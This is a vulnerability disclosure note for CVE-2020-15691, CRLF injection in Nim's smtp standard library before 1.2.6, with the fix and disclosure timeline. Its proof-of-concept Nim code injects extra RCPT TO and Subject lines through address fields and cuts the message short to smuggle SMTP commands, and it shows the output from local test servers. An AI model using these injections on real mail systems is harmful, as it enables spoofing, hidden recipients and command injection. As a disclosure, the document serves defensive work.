---
title: "Nim - stdlib smtp - multiple crlf injections"
date: 2020-07-30T18:41:52+01:00

cve: ["CVE-2020-15691"]
vendor: nim-lang
vendorUrl: https://nim-lang.org/
authors: tintinweb
affectedVersions: [ "< 1.2.6" ]
vulnClass: CWE-93

---

# Vulnerability Note

## Summary 

The following vulnerability note describes vulnerabilities found in the nim-lang `smtp` standard library.

also see: https://consensys.net/diligence/vulnerabilities/nim-smtp-crlf-injections/

## Details

### Description

The nim standard library `smtp` is vulnerable to multiple protocol character sequence injections (`CR-LF` and `CR-LF.CR-LF`). An injection is possible if the attacker controls any argument that is passed to the remote server such as any address (`from`, `to`, `cc`), or the message itself.


### Proof of Concept


#### 1) `CR-LF` injection in parameters to `createMessage` and `sendmail`

*note: `\c\LSubject: injected@googl.ecom"` in `mto` (note same works for `mCc, ..`)*

*note: `\c\LRCPT TO:<injected@gmail.com>` in  `fromAddr`, `toAddr`*

```nim
import smtp

var msg = createMessage("Hello from Nim's SMTP",
                        "test",
                        @["foo@gmail.com\c\LSubject: injected@googl.ecom"])
echo msg
let smtpConn = newSmtp(useSsl = false, debug=true)
smtpConn.connect("localhost", Port 10001)
smtpConn.sendmail("username@gmail.com\c\LRCPT TO:<injected@gmail.com>", @["foo@gmail.com\c\LRCPT TO:<injected@gmail.com>"], $msg)
```

Output:

```
⇒  nim c -r -d:ssl  smtp_inject.nim
...
Hint: /Users/tintin/workspace/nim/test/issues/smtp_injection/smtp_inject  [Exec]
TO: foo@gmail.com
Subject: injected@googl.ecom
Subject: Hello from Nim's SMTP

test
S:220 fake smtpd
C:HELO localhost

S:250 ok
C:MAIL FROM:<username@gmail.com>
RCPT TO:<injected@gmail.com>

S:250 ok
C:RCPT TO:<foo@gmail.com>
RCPT TO:<injected@gmail.com>

S:250 ok
C:DATA 

S:354 End data with <CR><LF>.<CR><LF>
C:.

S:250 ok
```

```
⇒  nc -l 10001
220 fake smtpd    
HELO localhost
250 ok
MAIL FROM:<username@gmail.com>
RCPT TO:<injected@gmail.com>
250 ok
RCPT TO:<foo@gmail.com>
RCPT TO:<injected@gmail.com>
250 ok
DATA 
354 End data with <CR><LF>.<CR><LF>
TO: foo@gmail.com
Subject: injected@googl.ecom
Subject: Hello from Nim's SMTP

test
.
250 ok
```

#### 2) msg-end injection in message: `<CR><LF>.<CR><LF>`

*note: `<CR><LF>.<CR><LF>` in message is not encoded and therefore allows to terminate the messsage early, injecting a command into the smtp stream.*

```nim
import smtp

var msg = createMessage("Hello from Nim's SMTP",
                        "Hello!.\c\L\n Is this awesome or what?\c\L\c\L.\c\LQUIT",  #EOF message injection in messagre. leading dot is not escaped
                        @["foo@gmail.com"])
echo msg
let smtpConn = newSmtp(useSsl = false, debug=true)
smtpConn.connect("localhost", Port 10001)
smtpConn.sendmail("username@gmail.com>", @["foo@gmail.com>"], $msg)
```

run:

```
Hint: /Users/tintin/workspace/nim/test/issues/smtp_injection/smtp_inject  [Exec]
TO: foo@gmail.com
Subject: Hello from Nim's SMTP

Hello!.

 Is this awesome or what?

.
QUIT
S:220 fake smptd
C:HELO localhost

S:250 ok
C:MAIL FROM:<username@gmail.com>>

S:250 ok
C:RCPT TO:<foo@gmail.com>>

S:250 ok
C:DATA 

S:354 End data with <CR><LF>.<CR><LF>
C:.

S:250 ok
```

```
⇒  nc -l 10001                                                                               
220 fake smptd
HELO localhost
250 ok
MAIL FROM:<username@gmail.com>>
250 ok
RCPT TO:<foo@gmail.com>>
250 ok
DATA 
354 End data with <CR><LF>.<CR><LF>
TO: foo@gmail.com
Subject: Hello from Nim's SMTP

Hello!.

 Is this awesome or what?

.
QUIT
.
250 ok
```

or using a simple SMTP debug server:

```python
import smtpd

class SMTPTestServer(smtpd.SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        print(peer, mailfrom, rcpttos, data)
    
```

Note that the msg is cut off at `CR-LF.CR-LF` and the next message is injected into the smtp stream.

```
⇒  python -m smtpd -n -c smtpdebug.SMTPTestServer localhost:10001
(('127.0.0.1', 49282), 'username@gmail.com>', ['foo@gmail.com>'], "TO: foo@gmail.com\nSubject: Hello from Nim's SMTP\n\nHello!.\n\n Is this awesome or what?\n")
```



### Proposed Fix

- properly validate all parameters used in the module. Do not allow any context sensitive characters of the underlying protocol

## Vendor Response

Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html) ([Official Security Advisory](https://github.com/nim-lang/security/security/advisories/GHSA-p5f5-fxhh-qx3w))

### Timeline

```
JUL/13/2020 - contact nim developers @telegram; provided details, PoC
MAR/26/2021 - vendor advisory (https://github.com/nim-lang/security/security/advisories/GHSA-p5f5-fxhh-qx3w), public disclosure
```

## References

* [1] https://nim-lang.org/
* [2] https://nim-lang.org/install.html
* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
* [4] https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html
